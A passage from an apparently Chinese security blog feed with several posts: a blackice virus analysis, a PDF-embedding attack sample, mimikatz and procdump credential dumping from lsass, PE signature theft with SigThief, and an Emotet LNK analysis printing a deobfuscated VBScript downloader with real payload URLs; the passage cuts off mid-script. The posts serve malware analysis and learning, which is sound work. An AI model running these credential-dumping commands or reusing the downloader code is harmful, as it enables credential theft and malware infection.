alt="image-20220602143844024"></p><p>创建线程修改注册表，远程下载并执行文件，结束杀软进程，感染office宏模板，可移动磁盘和磁盘。</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143850840.png" alt="image-20220602143850840"></p><h3 id="sub-404F0B"><a href="#sub-404F0B" class="headerlink" title="sub_404F0B"></a>sub_404F0B</h3><p>获取主机名，硬盘信息，卷序列号和MAC地址</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143901016.png" alt="image-20220602143901016"></p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143908961.png" alt="image-20220602143908961"></p><h3 id="sub-404E89"><a href="#sub-404E89" class="headerlink" title="sub_404E89"></a>sub_404E89</h3><p>提升进程权限，使其具有SeDebugPrivilege权限</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143917158.png" alt="image-20220602143917158"></p><h3 id="sub-404CB2"><a href="#sub-404CB2" class="headerlink" title="sub_404CB2"></a>sub_404CB2</h3><p>检查是否存在blackice.exe和kernel.dll，如果不存在则将自身复制过去</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144042379.png" alt="image-20220602144042379"></p><h3 id="sub-404384"><a href="#sub-404384" class="headerlink" title="sub_404384"></a>sub_404384</h3><p>注入exeplorer.exe进程，用于进程保护，获取exeplorer.exe的pid，然后写入shellcode，通过启动远程线程的方式启用shellcode</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144201249.png" alt="image-20220602144201249"></p><h3 id="sub-404A71"><a href="#sub-404A71" class="headerlink" title="sub_404A71"></a>sub_404A71</h3><p>注入线程创建注册表实现自启动</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144212246.png" alt="image-20220602144212246"></p><h3 id="sub-403D93"><a href="#sub-403D93" class="headerlink" title="sub_403D93"></a>sub_403D93</h3><p>从指定地址下载文件并写入blackice.ini文件，然后执行下载文件</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144220779.png" alt="image-20220602144220779"></p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144227708.png" alt="image-20220602144227708"></p><h3 id="sub-4050AC"><a href="#sub-4050AC" class="headerlink" title="sub_4050AC"></a>sub_4050AC</h3><p>查询指定杀软进程名称，并结束对应的杀软进程及其对应的线程</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144236102.png" alt="image-20220602144236102"></p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144243740.png" alt="image-20220602144243740"></p><h3 id="sub-403105"><a href="#sub-403105" class="headerlink" title="sub_403105"></a>sub_403105</h3><p>修改宏安全设置，感染office宏模板以实现宏病毒的传播</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144251150.png" alt="image-20220602144251150"></p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144258413.png" alt="image-20220602144258413"></p><h3 id="sub-404999"><a href="#sub-404999" class="headerlink" title="sub_404999"></a>sub_404999</h3><p>注册watchusb窗口类并创建该类窗口，监视磁盘变更的消息，如果是可移动磁盘则对其进行感染，并感染其中的目标文件</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144306472.png" alt="image-20220602144306472"></p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144314910.png" alt="image-20220602144314910"></p><h3 id="sub-403771"><a href="#sub-403771" class="headerlink" title="sub_403771"></a>sub_403771</h3><p>感染磁盘和网络资源文件</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144324735.png" alt="image-20220602144324735"></p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144330415.png" alt="image-20220602144330415"></p><h2 id="功能总结"><a href="#功能总结" class="headerlink" title="功能总结"></a>功能总结</h2><p>1、 复制自身到%windir%\system32\blackice.exe和%windir%\system32\kernel.dll文件。</p><p>2、 通过修改注册表设置word，execl的安全级别和实现开机自启动，用来实现病毒传播和持久化攻击。</p><p>3、 连接h_ttp:&#x2F;&#x2F;fmtwld.zj.com&#x2F;blackice&#x2F;url.txt和h_ttp:&#x2F;&#x2F;fmtwld.vicp.net&#x2F;blackice&#x2F;url.txt试图下载数据到本地，保存为%windir%\system32\blackice.ini文件运行。</p><p>4、 查询指定杀软进程名称，并结束对应的杀软进程及其对应的线程。</p><p>5、 注入explorer.exe进程来实现进程保护。</p><p>6、 通过感染本地磁盘，可移动磁盘和网络资源中的exe，xls，doc文件实现传播。</p><h2 id="处置建议"><a href="#处置建议" class="headerlink" title="处置建议"></a>处置建议</h2><p>1、 立即对被感染病毒的机器进行断网处理，防止病毒的后续攻击和进一步传播。</p><p>2、 删除%windir%\system32目录下的blackice.exe，kernel.dll和blackice.ini文件。</p><p>3、 使用专业杀毒软件对被感染系统和在被感染系统上使用过的可移动磁盘进行全盘查杀。</p><p>4、 删除注册表HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\run，HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\shell的相关的自启动键，修改注册表HKEY_CURRENT_USER\software\microsoft\office...\word(execl)\security还原word和execl的安全级别。</p><p>5、 删除病毒所创建的宏模板。</p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blackice</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PDF嵌入攻击</title>
    <link href="/2022/05/25/PDF%E5%B5%8C%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <url>/2022/05/25/PDF%E5%B5%8C%E5%85%A5%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>前两天无意看到某公众号推送的文章</p><p><a href="https://www.freebuf.com/news/333958.html">https://www.freebuf.com/news/333958.html</a></p><p>看起来是外文搬运，PDF文件似曾相识，在某客户单位的监测设备上看到过，再拿出来瞧瞧</p><p><a href="https://www.bleepingcomputer.com/news/security/pdf-smuggles-microsoft-word-doc-to-drop-snake-keylogger-malware/">外文原文</a></p><img src="image-20220525142158793.png" alt="样本信息" style="zoom:67%;" /><p>当时就感觉很有意思，原理很简单，但是静态免杀效果很好，截至今天卡巴和火绒都免杀，虽然运行起来大概率会被杀</p><p>其实就是很简单的PDF嵌入，执行JS代码(exportDataObject)</p><p><img src="/2022/05/25/PDF%E5%B5%8C%E5%85%A5%E6%94%BB%E5%87%BB/image-20220525142651194.png" alt="JavaScript代码"></p><p>exportDataObject函数包含 2 个参数的对象： </p><ul><li>cName，嵌入对象的名称</li><li>nLaunch，关于 PDF 阅读器应如何处理导出对象的说明</li></ul><p>nLaunch是一个整数，它具有三个有效值： </p><ol><li>提示用户输入路径并将文件保存在那里 </li><li>提示用户输入路径，保存文件，并要求操作系统打开它 </li><li>选择一个临时位置，将文件保存在那里，并要求操作系统打开它</li></ol><p><img src="/2022/05/25/PDF%E5%B5%8C%E5%85%A5%E6%94%BB%E5%87%BB/image-20220525142748304.png" alt="嵌入的word文件"></p><p>包含的docx文件包含CVE-2017-0199漏洞，发起请求htt_ps:&#x2F;&#x2F;<a href="mailto:&#x67;&#x69;&#116;&#104;&#117;&#98;&#x2e;&#99;&#111;&#x6d;&#x40;&#50;&#108;&#46;&#x6c;&#118;">&#x67;&#x69;&#116;&#104;&#117;&#98;&#x2e;&#99;&#111;&#x6d;&#x40;&#50;&#108;&#46;&#x6c;&#118;</a>&#x2F;26，实际跳转到</p><p>htt_p:&#x2F;&#x2F;192.227.196.211&#x2F;dhl_shp&#x2F;doc_000909000.doc，但是已经挂了，应该是HTA文件执行下一步攻击</p><p>真的是一步三折</p><p><img src="/2022/05/25/PDF%E5%B5%8C%E5%85%A5%E6%94%BB%E5%87%BB/image-20220525150923518.png" alt="通联地址"></p><p>类似的样本分析<a href="https://www.52pojie.cn/thread-1041653-1-1.html">https://www.52pojie.cn/thread-1041653-1-1.html</a></p><p>利用的同外文原文一样都有CVE-2017-11882</p><p>找到两个国外PDF嵌入攻击教程，比较老了，多是嵌入PE文件，不像这个样本绕了一圈，可以以后弄得玩</p><p><a href="https://ironhackers.es/en/tutoriales/pdf-malicioso-en-windows-10-con-settingcontent-ms-embebido/">https://ironhackers.es/en/tutoriales/pdf-malicioso-en-windows-10-con-settingcontent-ms-embebido/</a></p><p><a href="https://nora.codes/post/pdf-embedding-attacks/">https://nora.codes/post/pdf-embedding-attacks/</a></p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PDF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用mimikatz获取账号密码</title>
    <link href="/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/"/>
    <url>/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h3 id="事由"><a href="#事由" class="headerlink" title="事由"></a>事由</h3><p>翻看以前的文件夹突然看到mimikatz，突然想到之前遇到过一个挖矿的传染病毒，python2.7写的，几千行太多了，当时就懒得仔细看，毕竟都是源代码。好像里面有这个模块，就随便写了写，mimikatz主要也是用于内网渗透，密码收集的吧</p><p><img src="/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/image-20220524140354511.png" alt="image-20220524140354511"></p><p><img src="/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/image-20220524135921116.png" alt="image-20220524135921116"></p><h3 id="mimikatz简介"><a href="#mimikatz简介" class="headerlink" title="mimikatz简介"></a>mimikatz简介</h3><p>mimikatz是法国人Benjamin Delpy编写的一款轻量级的调试工具，在内网渗透过程中，它多数时候是作为一款抓取用户口令的工具，属于内网渗透必备工具之一，被很多人称之为密码抓取神器。然而Mimikatz其实并不只有抓取口令这个功能，它还能够创建票证、票证传递、hash传递，甚至伪造域管理凭证令牌等诸多功能。</p><p><a href="https://github.com/gentilkiwi/mimikatz/">https://github.com/gentilkiwi/mimikatz/</a></p><h3 id="使用mimikatz直接获取账号密码"><a href="#使用mimikatz直接获取账号密码" class="headerlink" title="使用mimikatz直接获取账号密码"></a>使用mimikatz直接获取账号密码</h3><p>mimikatz读取明文密码和hash时需要管理员权限</p><p>然后依次执行</p><figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">privilege::debug                <span class="hljs-regexp">//</span>提升至debug权限<br>sekurlsa::logonpasswords        <span class="hljs-regexp">//</span>抓取密码<br><br>或者<br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords full&quot;</span> &gt; pssword.txt <span class="hljs-keyword">exit</span>          <span class="hljs-regexp">//</span>结果输出到pssword.txt<br></code></pre></td></tr></table></figure><img src="屏幕截图095447.png" alt="屏幕截图095447" style="zoom: 67%;" /><p>Windows10比较麻烦，执行命令后需要将相应SHA1值解密，获取密码</p><p>（网上有人说可以通过修改注册表的方式抓取明文，尝试后发现显示 _TBAL_并没有显示明文密码，不知道哪里出的问题）</p><p><img src="/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE101038.png" alt="屏幕截图101038"></p><p>解码网站：<a href="https://www.somd5.com/">https://www.somd5.com/</a></p><p><img src="/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/image-20220524102018844.png" alt="image-20220524102018844"></p><h3 id="Procdump-mimikatz配合抓取密码"><a href="#Procdump-mimikatz配合抓取密码" class="headerlink" title="Procdump+mimikatz配合抓取密码"></a>Procdump+mimikatz配合抓取密码</h3><p>mimikatz容易被杀软查杀，而<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">Procdump</a>是微软官方的应用程序，文件本身不会被查杀</p><p>但测试过程中执行相应命令，Microsoft Defender报毒</p><p><img src="/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE103254-16533604085481.png" alt="屏幕截图103254"></p><p>所以之后还要重点考虑<strong>mimikatz的免杀策略</strong>，网上有很多相应的文章</p><p>采用Procdump获取内存文件lsass.exe进程 (它用于本地安全和登陆策略) 中存储的登录密码并转储到lsass.dmp文件中，之后我们就可以使用mimikatz去读取lsass.dmp获取到密码</p><p>生成转储文件lsass.dmp</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">procdump64.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-keyword">ma</span> lsass.<span class="hljs-keyword">exe</span> lsass.dmp<br></code></pre></td></tr></table></figure><img src="屏幕截图103347.png" alt="屏幕截图103347" style="zoom: 80%;" /><p>mimikatz读取转储文件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords full&quot;</span><br></code></pre></td></tr></table></figure><img src="屏幕截图103717.png" alt="屏幕截图103717" style="zoom:80%;" /><p>然后就可以解码得到的SHA1值</p><p>工具很强大不搞渗透简单了解一下算了</p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mimikatz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE文件数字签名</title>
    <link href="/2022/05/20/PE%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
    <url>/2022/05/20/PE%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/</url>
    
    <content type="html"><![CDATA[<h3 id="PE文件数字签名及验证过程"><a href="#PE文件数字签名及验证过程" class="headerlink" title="PE文件数字签名及验证过程"></a>PE文件数字签名及验证过程</h3><p>签名：</p><ul><li>软件发布者使用散列算法（如MD5或SHA）计算PE文件的散列值。</li><li>软件发布者使用私钥对散列值进行签名得到签名数据。</li><li>将签名私钥对应的公钥和签名数据等以证书的形式附加在PE文件之中，形成经过数字签名的PE文件。</li><li>软件发布者将经过数字签名的PE文件进行发布。</li></ul><p>验证：</p><ul><li>从PE文件证书中提取软件发布者的公钥、使用的散列算法、签名算法、原始散列值的签名数据。</li><li>使用提取的公钥和对应签名验证算法将签名数据还原为原始PE文件的原始散列值。</li><li>对现有PE文件使用同样的散列算法计算出对应的散列值。</li><li>对比两个散列值是否一致，从而判断数据是否被破坏和篡改。</li></ul><p>部分系统文件会包含微软的签名，例如C:\Windows\explorer.exe，在文件的属性中可以看到</p><p><img src="/2022/05/20/PE%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/image-20220519142715621.png" alt="image-20220519142715621"></p><p>也可以通过PowerShell的<strong>Get-AuthenticodeSignature</strong>命令看到</p><p><img src="/2022/05/20/PE%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/image-20220519142953496.png" alt="image-20220519142953496"></p><h3 id="PE文件格式和数字签名格式"><a href="#PE文件格式和数字签名格式" class="headerlink" title="PE文件格式和数字签名格式"></a>PE文件格式和数字签名格式</h3><p><img src="/2022/05/20/PE%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/v2-a23de788976665ae5b7599bd26771dbd_r.jpg" alt="preview"></p><p>使用CFF Explorer查看文件结构</p><p><img src="/2022/05/20/PE%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE153059.png" alt="屏幕截图"></p><figure class="highlight text"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs text">File Size: 5114880 bytes<br>PE Size: 5060608 bytes<br></code></pre></td></tr></table></figure><p>可知</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">Certificate Table的偏移地址为004D3800(5060608)<br>Certificate Table的前四字节保存长度，大小应该为0000D400（5114880-5060608=54272）<br></code></pre></td></tr></table></figure><p>如下图，PE头中的安全表(Certificate Table）信息</p><p><img src="/2022/05/20/PE%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE152504.png" alt="屏幕截图"></p><p>Certificate Table内容</p><p><img src="/2022/05/20/PE%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE1652.png" alt="屏幕截图"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">WIN_CERTIFICATE</span> &#123;<br>  DWORD dwLength;        <span class="hljs-comment">//指定属性证书条目的长度</span><br>  WORD wRevision;        <span class="hljs-comment">//包含证书版本号</span><br>  WORD wCertificateType;        <span class="hljs-comment">//指定 bCertificate 中内容类型</span><br>  BYTE bCertificate[];          <span class="hljs-comment">//包含证书，例如验证码签名</span><br>&#125; WIN_CERTIFICATE, *LPWIN_CERTIFICATE;<br></code></pre></td></tr></table></figure><p>详见<a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#the-attribute-certificate-table-image-only">https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#the-attribute-certificate-table-image-only</a></p><p><img src="/2022/05/20/PE%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/image-20220520104829178.png" alt="image-20220520104829178"></p><p>可以看到explorer.exe的bCertificate内容类型为0x0002,即证书内容 PKCS#7 <strong>SignedData</strong> 结构( 微软官方文档：<a href="https://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/Authenticode_PE.docx">Windows Authenticode Portable Executable Signature Format </a>)</p><p>bCertificate（证书内容）从Certificate Table的偏移地址+8开始，格式是ASN.1,可以通过<strong>ASN1View</strong>进行查看</p><img src="image-20220520105811145.png" alt="image-20220520105811145" style="zoom:80%;" /><p>要注意的是，在Certificate Table的尾部添加数据并不会影响计算出的文件hash，也就是说在Certificate Table尾部添加数据不会导致证书失效，所以可以在数字证书中隐藏Payload。</p><h3 id="数字签名的盗用和复制"><a href="#数字签名的盗用和复制" class="headerlink" title="数字签名的盗用和复制"></a>数字签名的盗用和复制</h3><p><a href="https://github.com/secretsquirrel/SigThief">SigThief</a>可自动实现保存复制Certificate Table</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sigthief.<span class="hljs-keyword">py</span> -i C:\Windows\explorer.<span class="hljs-keyword">exe</span> -t test.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><img src="image-20220519154725489.png" alt="image-20220519154725489" style="zoom: 80%;" /><p>但是文件hash已经改变，所以证书无法通过验证，显示无效</p><p>有一种通过验证的方法是<a href="https://docs.microsoft.com/zh-cn/archive/blogs/eduardonavarro/sips-subject-interface-package-and-authenticode">SIP</a>劫持，通过修改注册表中调用的证书验证方法，默认返回TRUE来使程序通过验证。详见参考链接1</p><p>反正我没成功 &#x3D; &#x3D;！</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zhuanlan.zhihu.com/p/30157991?from_voters_page=true">https://zhuanlan.zhihu.com/p/30157991?from_voters_page=true</a></p><p><a href="https://zhuanlan.zhihu.com/p/23512363">https://zhuanlan.zhihu.com/p/23512363</a></p><p><a href="https://blog.csdn.net/Eastmount/article/details/113774264">https://blog.csdn.net/Eastmount/article/details/113774264</a></p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数字签名</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Emotet的新形式-Link</title>
    <link href="/2022/05/17/Emotet%E7%9A%84%E6%96%B0%E5%BD%A2%E5%BC%8F-Link/"/>
    <url>/2022/05/17/Emotet%E7%9A%84%E6%96%B0%E5%BD%A2%E5%BC%8F-Link/</url>
    
    <content type="html"><![CDATA[<p>今天发现Emotet出现了新的攻击方式</p><p>第一次接触Emotet是采用的常见的Office宏病毒，然后升级到后来的宏4.0，现在又出现了新的攻击方式——利用LInk文件进行攻击。</p><p>搜集到的样本包括Link文件生成VBS和PowerShell两种，以生成VBS文件为例。</p><p><strong>文件名：Datos-2504.lnk</strong></p><p><strong>MD5: 95e0286c6c38320d9673b6492f9e2284</strong></p><img src="image-20220517144528337.png" alt="image-20220517144528337" style="zoom:67%;" /><figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">C:\Windows\system32\cmd.exe <span class="hljs-regexp">/v:on /</span>c findstr <span class="hljs-string">&quot;glKmfOKnQLYKnNs.*&quot;</span> <span class="hljs-string">&quot;Datos-2504.lnk&quot;</span>                                                                                                                         &gt; <span class="hljs-string">&quot;%tmp%\YlScZcZKeP.vbs&quot;</span> &amp; <span class="hljs-string">&quot;%tmp%\YlScZcZKeP.vbs&quot;</span><br></code></pre></td></tr></table></figure><p>启动CMD调用findstr在文件内搜索以”glKmfOKnQLYKnNs.*”开头的字符串保存到”%tmp%\YlScZcZKeP.vbs”下，并执行。</p><p>Link文件本身包含VBS脚本。</p><img src="image-20220517145225085.png" alt="image-20220517145225085" style="zoom: 67%;" /><p>生成的YlScZcZKeP.vbs经过混淆。</p><img src="image-20220517145700961.png" alt="image-20220517145700961" style="zoom:80%;" /><p>通过手工和WScript.StdOut.WriteLine方法去混淆得到可读代码。</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-keyword">on</span> <span class="hljs-keyword">error</span> <span class="hljs-keyword">resume</span> <span class="hljs-keyword">next</span><br><span class="hljs-keyword">Set</span> FSO = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Scripting.FileSystemObject&quot;</span>)<br><br><span class="hljs-keyword">Function</span> Base64Decode(<span class="hljs-keyword">ByVal</span> vCode)<br>    <span class="hljs-keyword">With</span> <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Msxml2.DOMDocument.3.0&quot;</span>).CreateElement(<span class="hljs-string">&quot;base64&quot;</span>)<br>        .dataType = <span class="hljs-string">&quot;bin.base64&quot;</span><br>        .text = vCode<br>        Base64Decode = Stream_BinaryTo<span class="hljs-built_in">String</span>(.nodeTypedValue)<br>    <span class="hljs-keyword">End</span> <span class="hljs-keyword">With</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br><br><span class="hljs-keyword">Function</span> Stream_BinaryTo<span class="hljs-built_in">String</span>(Binary)<br>    <span class="hljs-keyword">With</span> <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>)<br>        .Type = <span class="hljs-number">1</span><br>        .Open<br>        .Write Binary<br>        .Position = <span class="hljs-number">0</span><br>        .Type = <span class="hljs-number">2</span><br>        .CharSet = <span class="hljs-string">&quot;utf-8&quot;</span><br>        Stream_BinaryToString = .ReadText<br>    <span class="hljs-keyword">End</span> <span class="hljs-keyword">With</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br><br><span class="hljs-keyword">Dim</span> LmPxinnpsd(<span class="hljs-number">6</span>)<br><br><br>LmPxinnpsd(<span class="hljs-number">0</span>) = <span class="hljs-string">&quot;https://creemo.pl/wp-admin/ZKS1DcdquUT4Bb8Kb/&quot;</span><br><br>LmPxinnpsd(<span class="hljs-number">1</span>) = <span class="hljs-string">&quot;http://filmmogzivota.rs/SpryAssets/gDR/&quot;</span><br><br>LmPxinnpsd(<span class="hljs-number">2</span>) = <span class="hljs-string">&quot;http://demo34.ckg.hk/service/hhMZrfC7Mnm9JD/&quot;</span><br><br>LmPxinnpsd(<span class="hljs-number">3</span>) = <span class="hljs-string">&quot;http://focusmedica.in/fmlib/IxBABMh0I2cLM3qq1GVv/&quot;</span><br><br>LmPxinnpsd(<span class="hljs-number">4</span>) = <span class="hljs-string">&quot;http://cipro.mx/prensa/siZP69rBFmibDvuTP1L/&quot;</span><br><br>LmPxinnpsd(<span class="hljs-number">5</span>) = <span class="hljs-string">&quot;http://colegiounamuno.es/cgi-bin/E/&quot;</span><br><br><br><span class="hljs-keyword">Execute</span>(<span class="hljs-string">&quot;dIm xml,Ws,Db,FiLePaTH,uRL</span><br><span class="hljs-string">xml = &quot;</span>MSXml2.SeRVERXmlhtTp<span class="hljs-number">.3</span><span class="hljs-number">.0</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">Ws = &quot;</span>wscRipT.SHEll<span class="hljs-string">&quot;</span><br><span class="hljs-string">Db = &quot;</span>aDodb.STReam<span class="hljs-string">&quot;</span><br><span class="hljs-string">seT ImSHdnYdVR = CreAteOBjecT(ws)</span><br><span class="hljs-string">TmP = imsHdnydvR.EXpANdeNvIroNmEnTSTrIngS(&quot;</span>%tmp%<span class="hljs-string">&quot;)</span><br><span class="hljs-string">wiNDiR = iMshDnYdvR.ExPAndenviroNmEnTstRiNgs(&quot;</span>%wInDiR%<span class="hljs-string">&quot;) </span><br><span class="hljs-string"></span><br><span class="hljs-string">FilEPATH = tMp &amp; &quot;</span>\KzcEXkekpr.Zvp<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">CaLl prog</span><br><span class="hljs-string"> SUb PROG</span><br><span class="hljs-string">    ranDOmize</span><br><span class="hljs-string">    INDeX = iNT((5 - 0 + 1)*rnD + 0)</span><br><span class="hljs-string">    DiM msXML</span><br><span class="hljs-string">seT mSxML = CreateOBJEcT(xmL)</span><br><span class="hljs-string">    dIM STreAM</span><br><span class="hljs-string">sEt stream = crEaTEOBjECT(DB)</span><br><span class="hljs-string">    MsxML.oPEN &quot;</span><span class="hljs-keyword">GEt</span><span class="hljs-string">&quot;, BasE64Decode(lmPxInNpsd(iNdEX)), FAlse</span><br><span class="hljs-string">msXML.sETReQueStheadEr &quot;</span>uSer-AgeNT<span class="hljs-string">&quot;, 